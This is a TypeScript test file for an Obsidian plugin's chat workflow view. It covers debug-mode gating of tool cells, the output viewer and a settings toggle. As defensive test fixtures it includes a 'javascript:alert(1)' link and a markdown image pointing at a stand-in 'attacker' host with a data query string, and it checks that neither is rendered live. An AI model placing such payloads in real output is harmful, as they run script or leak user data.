// @vitest-environment happy-dom

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { App, Component } from "obsidian";

import { AdvancedSettingsSection } from "@apps/obsidian/ui/settings/AdvancedSettingsSection";
import { createTranslator } from "@adapters/i18n";
import {
  captureWorkflowUiState,
  renderWorkflowTimeline,
  toParentWorkflowModel,
  toSubAgentWorkflowModel,
  WorkflowTimelineModel,
  WorkflowUiState,
} from "@apps/obsidian/ui/chat/workflow";
import type { SubAgentWorkflowItem } from "@core/research";
import type { ChatDisplayMessage } from "@core/conversation";
import { createContainer, resetDom } from "../../support/domHarness";

const t = createTranslator("en").t;

function assistantWithToolCall(): ChatDisplayMessage {
  return {
    role: "assistant",
    content: "Answer",
    createdAt: "2026-01-01T00:00:00.000Z",
    researchProgress: {
      phase: "complete",
      disclosure: "auto",
      view: "expanded",
      reasoning: { phase: "complete", segments: [] },
      checkpoints: [],
      chain: [
        {
          kind: "tool-call",
          id: "t1",
          name: "search_index",
          label: "Search",
          status: "complete",
          args: { query: "vault notes", limit: 4242 },
          resultJson: JSON.stringify({ hits: ["private result"] }),
        },
      ],
    },
  };
}

function childItem(overrides: Partial<SubAgentWorkflowItem> = {}): SubAgentWorkflowItem {
  return {
    id: "t1",
    sessionId: "session-1",
    runId: "run-1",
    name: "search_index",
    label: "Search",
    sequence: 0,
    round: 1,
    status: "complete",
    startedAt: "2026-01-01T00:00:00.000Z",
    payloadState: "captured",
    badge: { text: "keyword-only", tooltip: "Safe tooltip" },
    args: { query: "vault notes", limit: 4242 },
    resultJson: JSON.stringify({ hits: ["[x](javascript:alert(1)) private result"] }),
    ...overrides,
  };
}

function childModel(overrides: Partial<SubAgentWorkflowItem> = {}): WorkflowTimelineModel {
  return toSubAgentWorkflowModel("session-1", [childItem(overrides)], "complete");
}

const adapters = {
  parent: () => toParentWorkflowModel(assistantWithToolCall()),
  child: () => childModel(),
};

function renderModel(
  host: HTMLElement,
  model: WorkflowTimelineModel,
  isDebugMode: boolean,
  options: {
    onOpenToolOutput?: () => void;
    viewerHost?: HTMLElement;
    uiState?: WorkflowUiState;
  } = {},
) {
  return renderWorkflowTimeline(
    host,
    model,
    {
      app: new App(),
      markdownContext: new Component(),
      isDebugMode,
      t,
      onOpenToolOutput: options.onOpenToolOutput ?? vi.fn(),
      ...(options.viewerHost ? { outputViewerHost: options.viewerHost } : {}),
    },
    options.uiState,
  );
}

function renderWorkflow(
  host: HTMLElement,
  isDebugMode: boolean,
  adapter: keyof typeof adapters = "parent",
  onOpenToolOutput = vi.fn(),
) {
  return renderModel(host, adapters[adapter](), isDebugMode, {
    onOpenToolOutput,
    ...(adapter === "child" ? { viewerHost: host } : {}),
  });
}

function openFirstCell(host: HTMLElement): void {
  host
    .querySelector<HTMLElement>(".attest-chat__tool-cell")
    ?.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
}

let container: HTMLElement;

beforeEach(() => {
  container = createContainer();
});

afterEach(() => {
  resetDom();
});

describe("debug-mode gating of the workflow transcript", () => {
  it("hides tool input and output cells outside debug mode through both adapters", () => {
    for (const adapter of ["parent", "child"] as const) {
      container.innerHTML = "";
      expect(renderWorkflow(container, false, adapter).rendered).toBe(true);

      expect(container.querySelectorAll(".attest-chat__tool-cell")).toHaveLength(0);
      expect(container.innerHTML).not.toContain("private result");
      expect(container.innerHTML).not.toContain("hits");
      openFirstCell(container);
      expect(container.querySelector(".attest-chat__tool-output-viewer")).toBeNull();
      const badge = container.querySelector(".attest-chat__tool-badge");
      if (adapter === "child") expect(badge?.getAttribute("title")).toBe("Safe tooltip");
    }
  });

  it("keeps the tool-call header visible in both modes", () => {
    renderWorkflow(container, false);
    const withoutDebug = container.querySelector(".attest-chat__tool-name")?.textContent;

    container.innerHTML = "";
    renderWorkflow(container, true);

    expect(withoutDebug).toBeTruthy();
    expect(container.querySelector(".attest-chat__tool-name")?.textContent).toBe(withoutDebug);
  });

  it("shows In and Out cells in debug mode through both adapters", () => {
    for (const adapter of ["parent", "child"] as const) {
      container.innerHTML = "";
      renderWorkflow(container, true, adapter);

      const labels = Array.from(
        container.querySelectorAll(".attest-chat__tool-cell-label"),
        (el) => el.textContent,
      );
      expect(labels).toEqual(["In", "Out"]);
      expect(container.textContent).toContain("private result");
    }
  });

  it("opens full output with the keyboard: parent through the callback, child as inline text closed on dispose", () => {
    const onOpenToolOutput = vi.fn();
    renderWorkflow(container, true, "parent", onOpenToolOutput);

    const cell = container.querySelector<HTMLElement>(".attest-chat__tool-cell");
    expect(cell?.getAttribute("tabindex")).toBe("0");
    cell?.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));

    expect(onOpenToolOutput).toHaveBeenCalledTimes(1);
    expect(container.querySelector(".attest-chat__tool-output-viewer")).toBeNull();

    onOpenToolOutput.mockClear();
    container.innerHTML = "";
    const handle = renderWorkflow(container, true, "child", onOpenToolOutput);

    container
      .querySelector<HTMLElement>(".attest-chat__tool-cell")
      ?.dispatchEvent(new KeyboardEvent("keydown", { key: " ", bubbles: true }));

    const text = container.querySelector(".attest-chat__tool-output-viewer-text");
    expect(text?.textContent).toContain("[x](javascript:alert(1)) private result");
    expect(text?.querySelector("a")).toBeNull();
    expect(onOpenToolOutput).not.toHaveBeenCalled();

    handle.dispose();
    handle.dispose();
    expect(container.querySelector(".attest-chat__tool-output-viewer")).toBeNull();
  });
});

describe("untrusted sub-agent payloads", () => {
  it("renders child note content as literal code, never as Markdown", () => {
    const content = "![x](https://attacker/?d=1) [[Some note]] ![[embed]]";
    renderModel(
      container,
      childModel({ name: "create_note", label: "Create", args: { path: "a.md", content } }),
      true,
    );

    const code = container.querySelector(".attest-chat__tool-cell--out code");
    expect(code?.textContent).toBe(content);
    expect(container.querySelector("img, a, .internal-link, .internal-embed")).toBeNull();
  });

  it("states a payload that was not captured in the node and the viewer", () => {
    for (const payloadState of ["disabled", "evicted", "truncated", "captured"] as const) {
      container.innerHTML = "";
      renderModel(
        container,
        childModel({ payloadState, name: "create_note", args: { path: "a.md" } }),
        true,
        {
          viewerHost: container,
        },
      );
      const state = container.querySelector(".attest-chat__tool-payload-state")?.textContent;
      if (payloadState === "captured") expect(state).toBeUndefined();
      else expect(state).toBe(t(`chat.workflow.payload.${payloadState}`));
    }

    container.innerHTML = "";
    renderModel(container, childModel({ payloadState: "evicted", args: { q: 1 } }), true, {
      viewerHost: container,
    });
    openFirstCell(container);
    const viewer = container.querySelector(".attest-chat__tool-output-viewer");
    expect(viewer?.querySelector(".attest-chat__tool-payload-state")?.textContent).toBe(
      t("chat.workflow.payload.evicted"),
    );
    expect(viewer?.querySelector("pre")?.textContent).toContain('"q": 1');
  });

  it("keeps the open child viewer across a rerender while debug stays on", () => {
    const first = renderModel(container, childModel(), true, { viewerHost: container });
    openFirstCell(container);
    const uiState = captureWorkflowUiState(container);
    first.dispose();
    container.innerHTML = "";

    const second = renderModel(container, childModel({ status: "failed" }), true, {
      viewerHost: container,
      uiState,
    });
    expect(
      container.querySelector(".attest-chat__tool-output-viewer")?.getAttribute("data-output-key"),
    ).toBe("sub-agent:session-1/run-1/t1");

    second.dispose();
    container.innerHTML = "";
    renderModel(container, childModel(), false, { viewerHost: container, uiState });
    expect(container.querySelector(".attest-chat__tool-output-viewer")).toBeNull();
  });
});

describe("debug-mode toggle in advanced settings", () => {
  function renderToggle(initial: boolean) {
    const state = { debugMode: initial };
    const saveSettings = vi.fn(async () => {});
    const refreshChatViews = vi.fn();
    new AdvancedSettingsSection({
      t,
      isDebugMode: () => state.debugMode,
      setDebugMode: (value) => {
        state.debugMode = value;
      },
      saveSettings,
      refreshChatViews,
    }).render(container);
    const toggle = container.querySelector<HTMLInputElement>("input[type=checkbox]");
    return { state, saveSettings, refreshChatViews, toggle };
  }

  it("reflects the persisted value", () => {
    expect(renderToggle(true).toggle?.checked).toBe(true);
    container.innerHTML = "";
    expect(renderToggle(false).toggle?.checked).toBe(false);
  });

  it("persists the change and redisplays open chat views", async () => {
    const { state, saveSettings, refreshChatViews, toggle } = renderToggle(false);

    toggle?.click();
    await new Promise((resolve) => setImmediate(resolve));

    expect(state.debugMode).toBe(true);
    expect(saveSettings).toHaveBeenCalledTimes(1);
    expect(refreshChatViews).toHaveBeenCalledTimes(1);
    expect(saveSettings.mock.invocationCallOrder[0]).toBeLessThan(
      refreshChatViews.mock.invocationCallOrder[0]!,
    );
  });

  it("keeps the advanced block collapsed by default", () => {
    renderToggle(false);
    const details = container.querySelector<HTMLDetailsElement>("details");

    expect(details?.open).toBe(false);
    expect(details?.querySelector("summary")?.textContent).toBe("Advanced");
  });
});
